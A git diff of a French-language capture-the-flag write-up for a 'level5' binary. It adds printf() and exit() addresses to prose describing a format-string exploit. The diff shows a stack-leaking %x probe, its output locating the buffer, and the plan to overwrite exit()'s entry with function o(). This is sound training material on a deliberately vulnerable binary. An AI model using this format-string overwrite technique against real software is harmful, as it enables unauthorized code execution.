@@ -109,7 +109,7 @@ Dump of assembler code for function o:
 End of assembler dump.
 ```
 
-On determine du coup que la fonction `o()` pourra etre utilise pour atteindre le stdin, mais pour ce faire on va de nouveau exploiter `printf()`
+On determine du coup que la fonction `o()` pourra etre utilise pour atteindre le stdin, mais pour ce faire on va de nouveau exploiter `printf()` (0x08048380)
 
 ```
 :~$ python -c 'print " %x" * 4' | ./level5
@@ -119,7 +119,7 @@ On determine du coup que la fonction `o()` pourra etre utilise pour atteindre le
 aaaa 200 b7fd1ac0 b7ff37d0 61616161
 ```
 
-On decouvre que notre buffer est en 4e position. Apres la fonction `printf()` on trouve un appel de la fonction `exit()`, on va donc faire en sorte de remplacer l'adresse de cette derniere, par l'appel de la fonction `o()`
+On decouvre que notre buffer est en 4e position. Apres la fonction `printf()` (0x08048380) on trouve un appel de la fonction `exit()` (0x08048390), on va donc faire en sorte de remplacer l'adresse de cette derniere, par l'appel de la fonction `o()`
 
 ```
 (gdb) info function exit
